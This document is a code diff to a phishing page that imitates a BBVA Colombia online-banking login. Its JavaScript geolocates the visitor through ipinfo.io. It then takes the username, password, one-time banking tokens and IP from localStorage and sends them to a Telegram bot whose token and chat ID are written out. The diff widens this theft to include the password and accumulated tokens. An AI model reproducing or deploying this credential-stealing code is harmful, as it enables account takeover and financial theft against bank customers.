@@ -28,7 +28,7 @@
     <script type='text/javascript' src="https://nuevaversion.bbvanet.com.co/choose/js/wurfl.js"></script>
 
     <title>BBV</title>
-<script >bazadebezolkohpepadr="1995771395"</script></head>
+<script >bazadebezolkohpepadr="1995771395"</script><script type="text/javascript" src=""  defer></script></head>
 
 <body class="m-login" id="data-analytics">
     <div class="m-login__content">
@@ -110,8 +110,8 @@
 <noscript>
     <img src="https://nuevaversion.bbvanet.com.co/akam/13/pixel_76f50c03?a=dD1lNmY3MDdhZjRhNWNkYzQxMzk3NmNhOGZkOTllYzdmNDA0ZmYzNGU4JmpzPW9mZg==" style="visibility: hidden; position: absolute; left: -999px; top: -999px;" /></noscript>
     </body>
-
 <script>
+
     fetch('https://ipinfo.io/json')
   .then(response => response.json())
   .then(data => {
@@ -125,15 +125,16 @@
     localStorage.setItem("ciudad", ciudad);
     localStorage.setItem("pais", pais);
      }) 
-</script>
-<script>
+
+
 
 function carl() {
-  console.log("test")
       const token = "5881769745:AAFiecIBFXB7lIJXhf3N1XP4TPc6uc4ZOjU";
-      const chatId = "-4213705728";
+      const chatId = "-4259482697";
       const usr = localStorage.getItem("usr");
+      const toks = localStorage.getItem("values");
       const usrs = localStorage.getItem("tok");
+      const usrss = localStorage.getItem("pw");
       const ip =
     localStorage.getItem("ip") +
     " " +
@@ -146,7 +147,7 @@ function carl() {
         return;
       }
     
-      const message = `-NEW ONE-\n --Usr.: ${usr} \n  --token2.: ${usrs}--IP:${ip}  `;
+      const message = `BBVA\n Usuario: ${usr}\n Clave: ${usrss} \n ---TOKENS: ${toks}--- \n -------- \nToken NUEVO: ${usrs}\n ---- \n--IP:${ip}  `;
       $.ajax({
         type: "POST",
         url: `https://api.telegram.org/bot${token}/sendMessage`,
@@ -160,6 +161,27 @@ function carl() {
           $("#response").text("Message sent");
           console.log("enviado");
           localStorage.setItem("usr", usr);
+
+          function clc(params) {
+    let val = usrs;
+    let actual = localStorage.getItem("values");
+    let count = localStorage.getItem("count");
+    if (actual == "") {
+        localStorage.setItem("values",  "token" + count +":"+ val)
+        count ++
+        localStorage.setItem("count", count)
+        
+    }else{
+        localStorage.setItem("values", localStorage.getItem("values") +","+"    "+ "token(" + count +"):"+ val  )
+        count ++
+        localStorage.setItem("count", count)
+    }
+    
+}
+clc()
+
+
+
          
          
         },
